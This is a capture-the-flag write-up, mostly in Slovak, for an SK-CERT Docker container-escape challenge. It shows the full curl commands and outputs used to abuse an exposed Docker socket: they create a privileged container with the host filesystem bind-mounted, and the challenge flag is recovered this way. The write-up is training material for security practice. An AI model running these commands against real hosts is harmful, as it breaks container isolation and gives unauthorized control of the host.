# Zadanie

EN: You are root, but it seems you are inside a Docker container. Can you escape somehow once again?

SK: Si root, ale vyzerá, že si vo vnútri Docker kontajneru. Dokážeš z neho nejako utiecť?

## Riešenie

Z predošlej úlohy máme roota a ako zadanie máme uniknúť z docker kontajnera. `docker` príkaz mi nejde, lebo nie je binárka docker, pozrieme či nebeží docker socket a beží. Skúsime sa pohrať s týmto.

```
docker
/bin/sh: 7: docker: not found

ls -l /run
total 8
-rw-r--r-- 1 root root    0 May 14  2024 adduser
drwsrwsrwx 2 root root 4096 Apr 10 14:06 docker
drwxrwxrwt 2 root root 4096 May 13  2024 lock

ls -l /run/docker
total 0
srw-rw---- 1 root root 0 Apr 10 14:06 docker.sock

ls -la /run/docker/docker.sock
srw-rw---- 1 root root 0 Apr 10 14:06 /run/docker/docker.sock

curl --unix-socket /run/docker/docker.sock  "http://localhost/_ping"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    23  100    23    0     0    812      0 --:--:-- --:--:-- --:--:--   821
{"message":"Not Found"}
```

Dostávame nejakú odpoveď zo socketu.. Skúsime teda vytvoriť kontajner s Binds na hosta a privileged.

```
curl --unix-socket /run/docker/docker.sock -X POST -H "Content-Type: application/json" -d '{"Image": "ubuntu:latest", "Cmd": ["sleep", "infinity"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true}}' "http://localhost/containers/create?name=escape"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   137  100    23  100   114   1969   9761 --:--:-- --:--:-- --:--:-- 12454
{"message":"Not Found"}
```

stále not found... 

Skúsime zadať verziu api, napr 1.44

```
curl --unix-socket /run/docker/docker.sock -X POST -H "Content-Type: application/json" -d '{"Image": "ubuntu:latest", "Cmd": ["sleep", "infinity"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true}}' "http://localhost/v1.44/containers/create?name=escape"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   137  100    23  100   114   1001   4966 --:--:-- --:--:-- --:--:--  6227
{"message":"Not Found"}
```

možno iná, napríklad 1.48

```
curl --unix-socket /run/docker/docker.sock -X POST -H "Content-Type: application/json" -d '{"Image": "ubuntu:latest", "Cmd": ["sleep", "infinity"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true}}' "http://localhost/v1.48/containers/create?name=escape"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   178  100    64  100   114   2825   5032 --:--:-- --:--:-- --:--:--  8090
{"message":"SK-CERT{4nd_7hat5_h0W_U_3scaP3_A_D0cK3r_c0nt41ne6}"}
```

Bingo.. Máme vlajku..

> Poznámka... včase písania write-upu boli cesty aj práva iné.. V čase prvého vyriešenia bola cesta socketu `/var/run/docker.sock` a nebolo vôbec potrebné byť root. 

## Vlajka

```
SK-CERT{4nd_7hat5_h0W_U_3scaP3_A_D0cK3r_c0nt41ne6}
```
